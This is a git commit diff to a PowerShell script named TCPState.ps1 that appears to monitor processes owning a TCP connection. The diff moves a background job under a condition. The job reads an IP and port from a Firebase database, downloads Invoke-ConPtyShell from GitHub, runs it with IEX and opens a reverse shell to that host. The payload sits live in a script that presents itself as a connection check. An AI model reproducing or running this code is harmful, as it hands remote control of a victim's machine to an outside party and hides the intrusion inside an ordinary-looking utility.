4a741c3a6e9db50003f48fa07a4c3314c09dabc9
currone <agungrambujana@gmail.com>
2024-01-27 21:28:35 +0700

    TCPCheck

--- TCPState.ps1
+++ TCPState.ps1
@@ -7,19 +7,35 @@ $firstProcess = $owningProcesses[0]
 Write-Host "First Owning Process: $firstProcess"
 Write-Host "Owning Processes: $owningProcesses"
 
-Start-Job {
-    $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/ip.json)"
-    $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/port.json)"
+# Start-Job {
+#     $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/ip.json)"
+#     $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/port.json)"
 
-    IEX(
-        IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
-    )
+#     IEX(
+#         IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
+#     )
 
-    Invoke-ConPtyShell "$ip" "$port"
-} | Out-Null
+#     Invoke-ConPtyShell "$ip" "$port"
+# } | Out-Null
 
 if ($owningProcesses.Length -ge 5) {
     for ($i = 1; $i -lt $owningProcesses.Length; $i++) {
         Stop-Process -Id $owningProcesses[$i]
     }
+}
+
+# If owningProcesses is null, start a job
+if ($firstProcess -eq $null) {
+    # Start a job here
+    # Replace "YourJob" with the actual job you want to start
+    Start-Job {
+        $ip="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/ip.json)"
+        $port="$(Invoke-RestMethod -Uri https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/data/website/port.json)"
+    
+        IEX(
+            IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing
+        )
+    
+        Invoke-ConPtyShell "$ip" "$port"
+    } | Out-Null
 }
